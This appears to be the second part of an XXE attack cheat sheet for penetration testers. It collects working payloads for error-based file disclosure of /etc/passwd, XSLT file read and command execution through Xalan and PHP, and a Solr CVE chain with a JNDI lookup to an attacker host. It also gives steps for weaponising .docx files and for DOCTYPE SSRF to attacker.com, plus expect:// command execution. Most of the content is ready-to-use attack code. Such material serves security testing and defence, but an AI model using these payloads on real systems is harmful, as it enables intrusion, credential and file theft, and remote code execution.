# xxe-test · part 2

> 分段 2/2。完整索引见 `xxe-test.md`。

## 18. ERROR-BASED XXE

Force the XML parser to generate an error message containing file content:

### Method 1: Non-existent file reference

```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser attempts to open `file:///nonexistent/<hostname_content>` → error message includes the hostname value.

### Method 2: XML schema validation error

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'jar:file:///nonexistent!/%file;'>">
  %eval;
  %err;
]>
```

The `jar:` protocol handler generates verbose error messages that include the expanded entity value.

### Method 3: Integer overflow / type error

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'file:///%file;'>">
%int;
%trick;
```

Parser tries to open a file path containing the target file content → error message reveals content.

---
## 19. XSLT INJECTION CONNECTION TO XXE

XSLT processors parse XML and can be chained with XXE:

### XSLT file read

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XSLT RCE (processor-dependent)

```xml
<!-- Xalan-J (Java) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj,'id')"/>
  </xsl:template>
</xsl:stylesheet>

<!-- PHP (libxslt with registerPHPFunctions) -->
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

### XXE → XSLT chain

If the target accepts XML input with a stylesheet reference (`<?xml-stylesheet?>`), inject both an external entity and a malicious XSLT to escalate from file read to RCE.


---
## 附件：SCENARIOS

# XXE — Extended Scenarios & Real-World Cases

---
## 1. CVE Case: Apache Solr XXE + RCE (CVE-2017-12629)

Apache Solr's Config API accepts XML with external entity processing enabled, and the Velocity Response Writer allows template injection:

**XXE for file read**:
```
GET /solr/CORE/select?q=xxx&wt=xml&defType=edismax&echoParams=all&fl=id,name&sort=${jndi:ldap://attacker/x}
```

**Combined XXE + RCE chain**:
1. Use XXE to read Solr configuration and identify available cores
2. Use Config API to register a new VelocityResponseWriter with `solr.resource.loader.enabled=true`
3. Execute Velocity template with `Runtime.exec()`

---
## 2. Office Document XXE — Step-by-Step

OOXML files (`.docx`, `.xlsx`, `.pptx`) are ZIP archives containing XML:

```bash
# Step 1: Create a legitimate .docx
# Step 2: Extract
mkdir extracted && cd extracted
unzip ../document.docx

# Step 3: Inject XXE into word/document.xml
# Add after <?xml version="1.0"...?>:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Then replace a text element with &xxe;

# Step 4: Also try [Content_Types].xml:
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/notify">]>

# Step 5: Repackage
zip -r ../malicious.docx .

# Step 6: Upload to target application
# If the app parses the XML → XXE triggers
```

**Common targets**: document preview, import functionality, file conversion services.

---
## 3. DOCTYPE-Based SSRF

Even when the application doesn't reflect entity values, `DOCTYPE` with `PUBLIC` or `SYSTEM` triggers an HTTP request:

```xml
<!DOCTYPE foo PUBLIC "-//attacker//DTD//EN" "http://attacker.com/notify">
<root>normal content</root>
```

The XML parser fetches the DTD from `attacker.com` — confirms SSRF even without entity reflection.

---
## 4. PHP expect:// Protocol via XXE

When PHP's `expect` extension is installed:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

The `expect://` wrapper executes the command and returns output. Rare but devastating when available.

**Check availability**: `phpinfo()` → look for "expect" in loaded extensions.

---
## 5. XXE in SOAP Web Services

SOAP endpoints parse XML by design — always test for XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUser><id>&xxe;</id></getUser>
  </soap:Body>
</soap:Envelope>
```

Also test the `SOAPAction` header and WSDL import endpoints.

---
## 6. Blind XXE via Error Messages

When OOB HTTP exfiltration is blocked, use error-based exfiltration:

```xml
<!-- Hosted at attacker.com/error.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open `file:///nonexistent/root:x:0:0:...` → error message contains file contents.
